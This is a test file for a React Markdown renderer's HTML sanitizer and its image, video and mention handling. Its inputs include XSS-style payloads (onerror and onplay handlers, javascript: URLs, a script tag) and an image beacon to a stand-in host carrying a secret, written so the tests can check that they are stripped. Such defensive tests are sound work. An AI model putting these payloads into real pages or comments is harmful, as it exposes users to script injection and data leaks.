// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import {
  ATTACHMENT_ASSET_ID,
  ATTACHMENT_ASSET_URL,
  COMMITTED_IMAGE_URL,
  requireAttachmentAssetId,
} from "@web/test/attachments";
import { Markdown } from ".";
import {
  AttachmentScopeProvider,
  VideoAssetsScope,
  type VideoAssets,
} from "./context";

const mermaidImport = vi.hoisted(() => vi.fn());

vi.mock("mermaid", () => {
  mermaidImport();
  return { default: { initialize: vi.fn(), render: vi.fn() } };
});

describe("Markdown without a mermaid fence", () => {
  it("never loads the diagram library", async () => {
    render(
      <Markdown
        content={"```ts\nconst a = 1;\n```\n\n```\ngraph TD\n```"}
        renderHtml
      />,
    );

    await screen.findByText("const a = 1;");
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(mermaidImport).not.toHaveBeenCalled();
    cleanup();
  });
});

describe("Markdown suggestion fences", () => {
  const body = "Try this:\n```suggestion\nreturn next;\n```";

  it("renders a Suggested-change card for an opted-in comment body", () => {
    render(<Markdown content={body} renderSuggestions />);
    expect(screen.getByText("Suggested change")).toBeTruthy();
    const table = screen.getByRole("table", { name: "Suggested change diff" });
    expect(table.textContent).toContain("return next;");
    // The fence is stripped from the text; the intro stays.
    expect(screen.getByText("Try this:")).toBeTruthy();
    expect(screen.queryByText(/```/)).toBeNull();
  });

  it("leaves fences as plain code in brief text, without the opt-in", () => {
    render(<Markdown content={body} />);
    expect(screen.queryByText("Suggested change")).toBeNull();
  });
});

describe("Markdown headings", () => {
  it("demotes authored headings so a body never adds a page-level h1", () => {
    render(<Markdown content={"# Summary\n\n## Detail"} />);

    expect(screen.getByRole("heading", { name: "Summary" }).tagName).toBe("H3");
    expect(screen.getByRole("heading", { name: "Detail" }).tagName).toBe("H4");
  });
});

describe("Markdown raw html images", () => {
  it("renders a pasted screenshot tag as an image with its size and alt", () => {
    render(
      <Markdown
        content={`Before\n\n<img width="1167" height="800" alt="Image" src="${ATTACHMENT_ASSET_URL}" />\n\nAfter`}
        renderHtml
      />,
    );

    const image = screen.getByRole("img", { name: "Image" });
    expect(image.getAttribute("src")).toBe(ATTACHMENT_ASSET_URL);
    expect(image.getAttribute("width")).toBe("1167");
    expect(image.getAttribute("height")).toBe("800");
    expect(screen.queryByText(/<img/)).toBeNull();
  });

  it("strips event handlers and styles from an image tag", () => {
    render(
      <Markdown
        content={`<img alt="x" src="${ATTACHMENT_ASSET_URL}" onerror="alert(1)" style="position:fixed" />`}
        renderHtml
      />,
    );

    const image = screen.getByRole("img", { name: "x" });
    expect(image.getAttribute("onerror")).toBeNull();
    expect(image.getAttribute("style")).toBeNull();
  });

  it("drops an image whose source scheme is not https", () => {
    render(
      <Markdown
        content={`<img alt="js" src="javascript:alert(1)" />\n\n<img alt="plain" src="http://example.com/a.png" />\n\n![md](http://example.com/b.png)`}
        renderHtml
      />,
    );

    expect(screen.queryByRole("img")).toBeNull();
  });

  it("drops a scheme-relative or path-relative image source", () => {
    render(
      <Markdown
        content={`<img alt="host" src="//evil.example/x.png" />\n\n<img alt="path" src="/api/repos/1/pulls/2/attachments/x" />\n\n<img alt="rel" src="./x.png" />\n\n![md](/x.png)`}
        renderHtml
      />,
    );

    expect(screen.queryByRole("img")).toBeNull();
  });

  it("strips focus steering attributes from raw html", () => {
    render(
      <Markdown
        content={`<p accesskey="k" tabindex="1" title="kept">Text</p>`}
        renderHtml
      />,
    );

    const paragraph = screen.getByText("Text");
    expect(paragraph.getAttribute("accesskey")).toBeNull();
    expect(paragraph.getAttribute("tabindex")).toBeNull();
    expect(paragraph.getAttribute("title")).toBe("kept");
  });

  it("drops a script tag entirely", () => {
    const { container } = render(
      <Markdown
        content={`<script>window.pwned = true</script>\n\nText`}
        renderHtml
      />,
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).not.toContain("pwned");
    expect(screen.getByText("Text")).toBeTruthy();
  });

  it("unwraps other html keeping its text", () => {
    const { container } = render(
      <Markdown
        content={`<details><summary>More</summary>Hidden</details>`}
        renderHtml
      />,
    );

    expect(container.querySelector("details")).toBeNull();
    expect(container.textContent).toContain("More");
    expect(container.textContent).toContain("Hidden");
  });

  it("routes an attachment through the api proxy inside a scope", () => {
    render(
      <AttachmentScopeProvider installed prNumber={7} repoId="555">
        <Markdown
          content={`<img alt="Image" src="${ATTACHMENT_ASSET_URL}" />`}
          renderHtml
        />
      </AttachmentScopeProvider>,
    );

    expect(screen.getByRole("img", { name: "Image" }).getAttribute("src")).toBe(
      `/api/repos/555/pulls/7/attachments/${ATTACHMENT_ASSET_ID}`,
    );
  });

  it("still renders task list checkboxes", () => {
    render(<Markdown content={"- [x] done\n- [ ] open"} renderHtml />);

    const boxes = screen.getAllByRole("checkbox");
    expect(boxes).toHaveLength(2);
    expect(boxes[0]?.hasAttribute("disabled")).toBe(true);
  });

  it("gives an image with no alt an empty one", () => {
    render(
      <Markdown content={`<img src="${ATTACHMENT_ASSET_URL}" />`} renderHtml />,
    );

    const image = document.querySelector("img");
    expect(image?.getAttribute("alt")).toBe("");
  });

  it("keeps footnote links pointing at their notes", () => {
    const { container } = render(
      <Markdown content={"Text[^1]\n\n[^1]: The note."} renderHtml />,
    );

    const links = container.querySelectorAll("a[href^='#']");
    expect(links.length).toBeGreaterThan(0);
    for (const link of links) {
      const target = link.getAttribute("href")?.slice(1) ?? "";
      expect(document.getElementById(target)).not.toBeNull();
    }
  });
});

describe("Markdown brief prose", () => {
  it("shows a raw tag as text without the opt-in", () => {
    render(
      <Markdown
        content={`<img alt="Image" src="${ATTACHMENT_ASSET_URL}" />`}
      />,
    );

    expect(screen.queryByRole("img")).toBeNull();
    expect(screen.getByText(/<img alt="Image"/)).toBeTruthy();
  });

  it("loads no image from markdown image syntax", () => {
    render(
      <Markdown content={"Done ![x](https://evil.example/leak?k=secret)"} />,
    );

    expect(screen.queryByRole("img")).toBeNull();
    expect(screen.getByText(/Done/)).toBeTruthy();
  });

  it("keeps markdown images in text people wrote", () => {
    render(
      <Markdown content={"![shot](https://example.com/a.png)"} renderHtml />,
    );

    expect(screen.getByRole("img", { name: "shot" })).toBeTruthy();
  });
});

describe("Markdown mentions", () => {
  function listMarkedTargets(): string[] {
    const markedTargets = screen
      .queryAllByTestId("mention")
      .map((node) => node.textContent ?? "");
    return markedTargets;
  }

  it("marks mentions in people's text, not inside code or links", () => {
    const { container } = render(
      <Markdown
        content={
          "cc @cara and @acme/backend, `@code` [@link](https://x.example)"
        }
        renderMentions
      />,
    );

    expect(listMarkedTargets()).toEqual(["@cara", "@acme/backend"]);
    expect(container.textContent).toContain("cc @cara and @acme/backend");
  });

  it("marks mentions inside raw html a comment carries", () => {
    render(
      <Markdown content={"<p>ping @cara</p>"} renderHtml renderMentions />,
    );

    expect(listMarkedTargets()).toEqual(["@cara"]);
  });

  it("never lets raw html forge a mention mark", () => {
    render(
      <Markdown
        content={'<span data-mention="evil" data-mention-kind="user">x</span>'}
        renderHtml
        renderMentions
      />,
    );

    expect(listMarkedTargets()).toEqual([]);
  });

  it("leaves the brief's own prose unmarked without the opt-in", () => {
    render(<Markdown content="cc @cara" />);

    expect(listMarkedTargets()).toEqual([]);
  });
});

describe("Markdown image that cannot load", () => {
  it("loads images lazily and decodes them off the main thread", () => {
    render(
      <Markdown content={`![Before](${ATTACHMENT_ASSET_URL})`} renderHtml />,
    );

    const image = screen.getByRole("img", { name: "Before" });
    expect(image.getAttribute("loading")).toBe("lazy");
    expect(image.getAttribute("decoding")).toBe("async");
  });

  it("keeps the title, align and language the sanitizer allows", () => {
    render(
      <AttachmentScopeProvider
        installed
        prNumber={7}
        repoId="555"
        repoSlug="octo/hello"
      >
        <Markdown
          content={`![Chart](https://example.com/a.png "Weekly chart")\n\n<img align="right" dir="rtl" lang="he" alt="Logo" src="${COMMITTED_IMAGE_URL}">`}
          renderHtml
        />
      </AttachmentScopeProvider>,
    );

    const chart = screen.getByRole("img", { name: "Chart" });
    expect(chart.getAttribute("title")).toBe("Weekly chart");
    const logo = screen.getByRole("img", { name: "Logo" });
    expect(logo.getAttribute("align")).toBe("right");
    expect(logo.getAttribute("dir")).toBe("rtl");
    expect(logo.getAttribute("lang")).toBe("he");
    expect(logo.getAttribute("data-original-source")).toBeNull();
  });

  it("sends no referrer to an image host outside this instance", () => {
    render(
      <AttachmentScopeProvider installed prNumber={7} repoId="555">
        <Markdown
          content={`![Outside](https://example.com/shot.png)\n\n![Pasted](${ATTACHMENT_ASSET_URL})`}
          renderHtml
        />
      </AttachmentScopeProvider>,
    );

    const outside = screen.getByRole("img", { name: "Outside" });
    const pasted = screen.getByRole("img", { name: "Pasted" });
    expect(outside.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(pasted.getAttribute("src")).toMatch(/^\/api\//);
    expect(pasted.hasAttribute("referrerpolicy")).toBe(false);
  });

  it("swaps an image that errors for the failed row", () => {
    render(
      <Markdown
        content={`Before\n\n![Checkout after](${ATTACHMENT_ASSET_URL})\n\nAfter`}
        renderHtml
      />,
    );

    fireEvent.error(screen.getByRole("img", { name: "Checkout after" }));

    expect(screen.queryByRole("img", { name: "Checkout after" })).toBeNull();
    expect(screen.getByTestId("media-failed-row").textContent).toContain(
      "Checkout after",
    );
    const link = screen.getByRole("link", { name: /Open on GitHub/ });
    expect(link.getAttribute("href")).toBe(ATTACHMENT_ASSET_URL);
  });

  it("shows a new image at the same place after a failed one", () => {
    const failedAddress = "https://images.example.com/broken.png";
    const nextAddress = "https://images.example.com/fixed.png";
    const { rerender } = render(
      <Markdown content={`![Chart](${failedAddress})`} renderHtml />,
    );
    fireEvent.error(screen.getByRole("img", { name: "Chart" }));

    rerender(<Markdown content={`![Chart](${nextAddress})`} renderHtml />);

    const image = screen.getByRole("img", { name: "Chart" });
    expect(image.getAttribute("src")).toBe(nextAddress);
    expect(screen.queryByTestId("media-failed-row")).toBeNull();
  });

  it("links a proxied image's row to the address the author wrote", () => {
    render(
      <AttachmentScopeProvider
        installed
        prNumber={7}
        repoId="555"
        repoSlug="octo/hello"
      >
        <Markdown content={`![](${COMMITTED_IMAGE_URL})`} renderHtml />
      </AttachmentScopeProvider>,
    );

    const image = screen.getByRole("presentation");
    expect(image.getAttribute("src")).not.toBe(COMMITTED_IMAGE_URL);
    fireEvent.error(image);

    expect(screen.getByText("Image could not load")).toBeTruthy();
    const link = screen.getByRole("link", { name: /Open on GitHub/ });
    expect(link.getAttribute("href")).toBe(COMMITTED_IMAGE_URL);
  });

  it("gives an outside-host image's row no link", () => {
    render(
      <Markdown content="![Chart](https://example.com/chart.png)" renderHtml />,
    );

    fireEvent.error(screen.getByRole("img", { name: "Chart" }));

    expect(screen.getByTestId("media-failed-row")).toBeTruthy();
    expect(screen.queryByRole("link")).toBeNull();
  });

  it("never takes the link address from the author's own attribute", () => {
    render(
      <Markdown
        content={`<img alt="x" data-original-source="${ATTACHMENT_ASSET_URL}" src="https://example.com/x.png" />`}
        renderHtml
      />,
    );

    fireEvent.error(screen.getByRole("img", { name: "x" }));

    expect(screen.queryByRole("link")).toBeNull();
  });

  it("nests no second link in a failed image wrapped by a link", () => {
    const { container } = render(
      <Markdown
        content={`[![Build](${ATTACHMENT_ASSET_URL})](https://example.com/ci)`}
        renderHtml
      />,
    );

    fireEvent.error(screen.getByRole("img", { name: "Build" }));

    expect(screen.getByTestId("media-failed-row")).toBeTruthy();
    expect(container.querySelectorAll("a")).toHaveLength(1);
    expect(container.querySelector("a a")).toBeNull();
  });
});

describe("Markdown image that failed before the page hydrated", () => {
  afterEach(() => {
    vi.restoreAllMocks();
    Reflect.deleteProperty(HTMLImageElement.prototype, "decode");
  });

  function stubSettledImage(decodes: boolean): void {
    vi.spyOn(HTMLImageElement.prototype, "complete", "get").mockReturnValue(
      true,
    );
    Object.defineProperty(HTMLImageElement.prototype, "decode", {
      configurable: true,
      value: () => (decodes ? Promise.resolve() : Promise.reject(new Error())),
    });
  }

  it("shows the failed row for an image already broken at mount", async () => {
    stubSettledImage(false);

    render(
      <Markdown content={`![Before](${ATTACHMENT_ASSET_URL})`} renderHtml />,
    );

    expect(await screen.findByTestId("media-failed-row")).toBeTruthy();
  });

  it("keeps an image that had already loaded at mount", async () => {
    stubSettledImage(true);

    render(
      <Markdown content={`![Before](${ATTACHMENT_ASSET_URL})`} renderHtml />,
    );
    await Promise.resolve();

    expect(screen.getByRole("img", { name: "Before" })).toBeTruthy();
    expect(screen.queryByTestId("media-failed-row")).toBeNull();
  });
});

const PROXIED_ASSET_PATH = `/api/repos/555/pulls/7/attachments/${ATTACHMENT_ASSET_ID}`;

interface PullRequestTextProps {
  content: string;
  videoAssets?: VideoAssets;
}

function PullRequestText({ content, videoAssets }: PullRequestTextProps) {
  const markdown = <Markdown content={content} renderHtml renderMentions />;
  return (
    <AttachmentScopeProvider
      installed
      prNumber={7}
      repoId="555"
      repoSlug="octo/hello"
    >
      {videoAssets === undefined ? (
        markdown
      ) : (
        <VideoAssetsScope value={videoAssets}>{markdown}</VideoAssetsScope>
      )}
    </AttachmentScopeProvider>
  );
}

function stubVideoAssets(confirmed?: readonly string[]): VideoAssets {
  const videoAssets: VideoAssets = { requestVideoAssets: vi.fn() };
  if (confirmed === undefined) {
    return videoAssets;
  }
  const videoAssetIds = new Set(confirmed.map(requireAttachmentAssetId));
  return { ...videoAssets, videoAssetIds };
}

function queryVideo(container: HTMLElement): HTMLVideoElement | null {
  return container.querySelector("video");
}

describe("Markdown raw html videos", () => {
  afterEach(cleanup);

  it("plays a pasted video through the proxy, never on its own", () => {
    const { container } = render(
      <PullRequestText
        content={`<video src="${ATTACHMENT_ASSET_URL}" width="640" autoplay muted loop poster="https://example.com/p.png" preload="auto" crossorigin="use-credentials" onplay="alert(1)"></video>`}
      />,
    );

    const video = queryVideo(container);
    expect(video?.getAttribute("src")).toBe(PROXIED_ASSET_PATH);
    expect(video?.hasAttribute("controls")).toBe(true);
    expect(video?.getAttribute("preload")).toBe("metadata");
    expect(video?.getAttribute("width")).toBe("640");
    for (const attribute of [
      "autoplay",
      "muted",
      "loop",
      "poster",
      "crossorigin",
      "onplay",
    ]) {
      expect(video?.hasAttribute(attribute)).toBe(false);
    }
  });

  it("plays a video committed to the pull request's own repository", () => {
    const committedVideo = COMMITTED_IMAGE_URL.replace(".png", ".mp4");
    const { container } = render(
      <PullRequestText content={`<video src="${committedVideo}"></video>`} />,
    );

    expect(queryVideo(container)?.getAttribute("src")).toContain(
      "/api/repos/555/pulls/7/committed-file?source=",
    );
  });

  it("keeps no source child, so the player has one address", () => {
    const { container } = render(
      <PullRequestText
        content={`<video controls><source src="${ATTACHMENT_ASSET_URL}"></video>`}
      />,
    );

    expect(container.querySelector("source")).toBeNull();
    expect(queryVideo(container)).toBeNull();
  });

  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["http", "http://example.com/a.mp4"],
    ["relative", "/api/secret.mp4"],
  ])("drops a video with a %s source", (_name, source) => {
    const { container } = render(
      <PullRequestText content={`<video src="${source}"></video>`} />,
    );

    expect(queryVideo(container)).toBeNull();
  });

  it("leaves a video on an outside host a link", () => {
    const outside = "https://example.com/demo.mp4";
    const { container } = render(
      <PullRequestText content={`<video src="${outside}"></video>`} />,
    );

    expect(queryVideo(container)).toBeNull();
    expect(
      screen.getByRole("link", { name: outside }).getAttribute("href"),
    ).toBe(outside);
  });

  it("leaves an own-repository video link a link", () => {
    const committedVideo = COMMITTED_IMAGE_URL.replace(".png", ".mp4");
    const { container } = render(
      <PullRequestText content={`See [the demo](${committedVideo}).`} />,
    );

    expect(queryVideo(container)).toBeNull();
    expect(screen.getByRole("link", { name: "the demo" })).toBeTruthy();
  });
});

describe("Markdown bare pasted asset line", () => {
  afterEach(cleanup);

  it("plays the line once the page confirms the asset is a video", () => {
    const { container } = render(
      <PullRequestText
        content={`Demo:\n${ATTACHMENT_ASSET_URL}`}
        videoAssets={stubVideoAssets([ATTACHMENT_ASSET_ID])}
      />,
    );

    expect(queryVideo(container)?.getAttribute("src")).toBe(PROXIED_ASSET_PATH);
    expect(screen.queryByRole("link")).toBeNull();
  });

  it("keeps the line a link and asks while unconfirmed", () => {
    const videoAssets = stubVideoAssets();
    const { container } = render(
      <PullRequestText
        content={ATTACHMENT_ASSET_URL}
        videoAssets={videoAssets}
      />,
    );

    expect(queryVideo(container)).toBeNull();
    const link = screen.getByRole("link", { name: ATTACHMENT_ASSET_URL });
    expect(link.getAttribute("href")).toBe(ATTACHMENT_ASSET_URL);
    expect(link.hasAttribute("data-pasted-asset")).toBe(false);
    expect(videoAssets.requestVideoAssets).toHaveBeenCalledWith(
      ATTACHMENT_ASSET_ID,
    );
  });

  it("keeps a line github did not render as a video a link", () => {
    const { container } = render(
      <PullRequestText
        content={ATTACHMENT_ASSET_URL}
        videoAssets={stubVideoAssets([])}
      />,
    );

    expect(queryVideo(container)).toBeNull();
    expect(
      screen.getByRole("link", { name: ATTACHMENT_ASSET_URL }),
    ).toBeTruthy();
  });

  it("asks nothing for text with no bare asset line", () => {
    const videoAssets = stubVideoAssets();

    render(
      <PullRequestText
        content={`See [the recording](${ATTACHMENT_ASSET_URL}) and ${ATTACHMENT_ASSET_URL} inline`}
        videoAssets={videoAssets}
      />,
    );

    expect(videoAssets.requestVideoAssets).not.toHaveBeenCalled();
  });

  it("never lets raw html forge the bare line's mark", () => {
    const videoAssets = stubVideoAssets([ATTACHMENT_ASSET_ID]);
    const { container } = render(
      <PullRequestText
        content={`<a href="https://example.com/x" data-pasted-asset="${ATTACHMENT_ASSET_ID}">x</a>`}
        videoAssets={videoAssets}
      />,
    );

    expect(queryVideo(container)).toBeNull();
    expect(videoAssets.requestVideoAssets).not.toHaveBeenCalled();
  });

  it("stays a link outside a pull request", () => {
    const { container } = render(
      <Markdown content={ATTACHMENT_ASSET_URL} renderHtml />,
    );

    expect(queryVideo(container)).toBeNull();
    expect(
      screen.getByRole("link", { name: ATTACHMENT_ASSET_URL }),
    ).toBeTruthy();
  });
});

describe("Markdown video that cannot load", () => {
  afterEach(() => {
    cleanup();
    Reflect.deleteProperty(HTMLMediaElement.prototype, "error");
  });

  it("swaps a player that errors for the video failed row", () => {
    const { container } = render(
      <PullRequestText
        content={`<video src="${ATTACHMENT_ASSET_URL}"></video>`}
      />,
    );

    const video = queryVideo(container);
    if (video === null) {
      throw new Error("expected a player");
    }
    fireEvent.error(video);

    expect(queryVideo(container)).toBeNull();
    expect(screen.getByText("Video could not load")).toBeTruthy();
    const link = screen.getByRole("link", { name: /Open on GitHub/ });
    expect(link.getAttribute("href")).toBe(ATTACHMENT_ASSET_URL);
  });

  it("plays a new video at the same place after a failed one", () => {
    const nextAssetId = "0f6c1f2e-61b3-4d55-9c1a-0b2d7f3e9a10";
    const nextAddress = `https://github.com/user-attachments/assets/${nextAssetId}`;
    const view = render(
      <PullRequestText
        content={`<video src="${ATTACHMENT_ASSET_URL}"></video>`}
      />,
    );
    const failed = queryVideo(view.container);
    if (failed === null) {
      throw new Error("expected a player");
    }
    fireEvent.error(failed);

    view.rerender(
      <PullRequestText content={`<video src="${nextAddress}"></video>`} />,
    );

    const video = queryVideo(view.container);
    expect(video?.getAttribute("src")).toBe(
      `/api/repos/555/pulls/7/attachments/${nextAssetId}`,
    );
    expect(screen.queryByTestId("media-failed-row")).toBeNull();
  });

  it("swaps a confirmed bare line's player that errors too", () => {
    const { container } = render(
      <PullRequestText
        content={ATTACHMENT_ASSET_URL}
        videoAssets={stubVideoAssets([ATTACHMENT_ASSET_ID])}
      />,
    );

    const video = queryVideo(container);
    if (video === null) {
      throw new Error("expected a player");
    }
    fireEvent.error(video);

    expect(screen.getByTestId("media-failed-row")).toBeTruthy();
    const link = screen.getByRole("link", { name: /Open on GitHub/ });
    expect(link.getAttribute("href")).toBe(ATTACHMENT_ASSET_URL);
  });

  it("shows the failed row for a player already broken at mount", async () => {
    Object.defineProperty(HTMLMediaElement.prototype, "error", {
      configurable: true,
      value: { code: 4 },
    });

    render(
      <PullRequestText
        content={`<video src="${ATTACHMENT_ASSET_URL}"></video>`}
      />,
    );

    expect(await screen.findByTestId("media-failed-row")).toBeTruthy();
  });
});
